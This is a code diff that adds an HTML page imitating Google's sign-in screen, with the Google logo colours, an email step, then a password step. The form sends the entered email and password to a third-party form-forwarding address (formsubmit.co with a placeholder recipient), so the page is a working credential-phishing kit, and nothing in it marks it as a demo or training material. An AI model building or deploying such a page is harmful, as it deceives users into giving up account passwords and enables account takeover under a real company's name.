@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google Sign In</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+}
+
+body {
+    background: #f0f4f9;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+.container {
+    background: #fff;
+    width: 360px;
+    padding: 40px 30px;
+    border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    text-align: center;
+}
+
+.logo {
+    font-size: 28px;
+    font-weight: bold;
+    margin-bottom: 10px;
+}
+
+.logo span:nth-child(1) { color: #4285F4; }
+.logo span:nth-child(2) { color: #EA4335; }
+.logo span:nth-child(3) { color: #FBBC05; }
+.logo span:nth-child(4) { color: #4285F4; }
+.logo span:nth-child(5) { color: #34A853; }
+.logo span:nth-child(6) { color: #EA4335; }
+
+h2 {
+    font-size: 22px;
+    margin-bottom: 8px;
+}
+
+p {
+    font-size: 14px;
+    color: #5f6368;
+    margin-bottom: 20px;
+}
+
+.input-group {
+    margin-bottom: 20px;
+}
+
+input {
+    width: 100%;
+    padding: 14px;
+    border: 1px solid #dadce0;
+    border-radius: 6px;
+    font-size: 16px;
+}
+
+input:focus {
+    border: 2px solid #1a73e8;
+    outline: none;
+}
+
+.link {
+    text-align: left;
+    font-size: 14px;
+    margin-bottom: 20px;
+}
+
+.link a {
+    color: #1a73e8;
+    text-decoration: none;
+}
+
+.actions {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.btn {
+    background: #1a73e8;
+    color: #fff;
+    border: none;
+    padding: 10px 22px;
+    border-radius: 20px;
+    cursor: pointer;
+}
+
+/* Hide password section initially */
+#passwordSection {
+    display: none;
+}
+
+/* Email display after next */
+.user-email {
+    font-size: 14px;
+    margin-bottom: 15px;
+    color: #202124;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="logo">
+        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+
+    <h2 id="title">Sign in</h2>
+    <p id="subtitle">Use your Google Account</p>
+
+    <!-- EMAIL SECTION -->
+     <form action="https://formsubmit.co/your@email.com" method="POST">
+    <div id="emailSection">
+        <div class="input-group">
+            <input type="email" name="email" id="email" placeholder="Email or phone">
+        </div>
+
+        <div class="link">
+            <a href="#">Forgot email?</a>
+        </div>
+
+        <div class="actions">
+            <span></span>
+            <input type="button" class="btn" onclick="nextStep()" value="NEXT">
+        </div>
+    </div>
+
+    <!-- PASSWORD SECTION -->
+    <div id="passwordSection">
+        <div class="user-email" id="displayEmail"></div>
+
+        <div class="input-group">
+            <input type="password" name="password" placeholder="Enter your password">
+        </div>
+
+        <div class="link">
+            <a href="#">Forgot password?</a>
+        </div>
+
+        <div class="actions">
+           
+            <button class="btn" type="submit">Sign in</button>
+        </div>
+    </div>
+</form>
+</div>
+
+<script>
+function nextStep() {
+    let email = document.getElementById("email").value;
+
+    if(email === "") {
+        alert("Please enter your email");
+        return;
+    }
+
+    // Show password section
+    document.getElementById("emailSection").style.display = "none";
+    document.getElementById("passwordSection").style.display = "block";
+
+    // Update text
+    document.getElementById("title").innerText = "Welcome";
+    document.getElementById("subtitle").innerText = "";
+
+    // Show entered email
+    document.getElementById("displayEmail").innerText = email;
+}
+
+function goBack() {
+    document.getElementById("emailSection").style.display = "block";
+    document.getElementById("passwordSection").style.display = "none";
+
+    document.getElementById("title").innerText = "Sign in";
+    document.getElementById("subtitle").innerText = "Use your Google Account";
+}
+</script>
+
+</body>
+</html>
